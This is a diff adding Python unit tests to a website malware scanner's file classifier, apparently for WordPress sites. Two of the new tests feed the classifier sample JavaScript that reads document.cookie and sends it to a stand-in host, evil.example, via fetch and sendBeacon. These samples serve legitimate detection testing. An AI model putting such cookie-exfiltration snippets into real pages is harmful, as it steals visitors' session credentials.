@@ -41,6 +41,35 @@ class SecurityScanTests(unittest.TestCase):
         self.assertGreaterEqual(score, 35)
         self.assertIn('non-PHP extension', ' '.join(reasons))
 
+    def test_litespeed_generated_js_with_generic_exec_names_is_clean(self):
+        score, severity, reasons = s.classify_file(
+            Path('/home/site/public_html/wp-content/litespeed/js/1ef14f2102aa5cee6db9b4964949b3f5.js'),
+            "function exec(x){return x;} function system(y){return y;} evalCode = false;"
+        )
+        self.assertEqual(score, 0)
+        self.assertEqual(severity, 'CLEAN')
+        self.assertEqual(reasons, [])
+
+    def test_suspicious_js_cookie_exfiltration_scores_medium_or_higher(self):
+        text = "document.cookie; fetch('https://evil.example/x?c=' + document.cookie);"
+        score, severity, reasons = s.classify_file(
+            Path('/home/site/public_html/wp-content/themes/theme/assets/app.js'),
+            text
+        )
+        self.assertGreaterEqual(score, 30)
+        self.assertIn(severity, ('MEDIUM', 'HIGH', 'CRITICAL'))
+        self.assertTrue(any('outbound' in reason.lower() or 'credential' in reason.lower() for reason in reasons))
+
+    def test_litespeed_js_still_flags_strong_cookie_exfiltration(self):
+        text = "document.cookie; navigator.sendBeacon('https://evil.example/x', document.cookie);"
+        score, severity, reasons = s.classify_file(
+            Path('/home/site/public_html/wp-content/litespeed/js/abcdef1234567890abcdef1234567890.js'),
+            text
+        )
+        self.assertGreaterEqual(score, 30)
+        self.assertNotEqual(severity, 'CLEAN')
+        self.assertTrue(reasons)
+
     def test_quarantine_requires_matching_hash_and_writes_manifest(self):
         with tempfile.TemporaryDirectory() as directory:
             base = Path(directory)
